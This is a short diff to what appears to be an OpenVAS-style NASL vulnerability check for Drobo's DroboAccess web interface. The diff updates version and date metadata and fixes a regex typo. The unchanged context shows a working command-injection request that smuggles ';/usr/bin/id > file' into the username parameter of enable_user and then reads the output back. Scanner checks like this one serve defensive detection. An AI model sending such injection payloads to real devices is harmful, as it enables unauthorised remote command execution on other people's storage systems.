@@ -21,8 +21,8 @@
 if (description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.142107");
-  script_version("$Revision: 14053 $");
-  script_tag(name:"last_modification", value:"$Date: 2019-03-08 11:08:56 +0100 (Fri, 08 Mar 2019) $");
+  script_version("2019-07-24T14:33:07+0000");
+  script_tag(name:"last_modification", value:"2019-07-24 14:33:07 +0000 (Wed, 24 Jul 2019)");
   script_tag(name:"creation_date", value:"2019-03-08 12:09:22 +0700 (Fri, 08 Mar 2019)");
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
@@ -79,7 +79,7 @@ url = "/DroboAccess/enable_user?username=test';/usr/bin/id%20>%20" + file +"'&en
 req = http_get(port: port, item: url);
 res = http_keepalive_send_recv(port: port, data: req);
 
-if (res !~ "^^HTTP/1\.[01] 200")
+if (res !~ "^HTTP/1\.[01] 200")
   exit(0);
 
 url = "/DroboAccess/" + file;
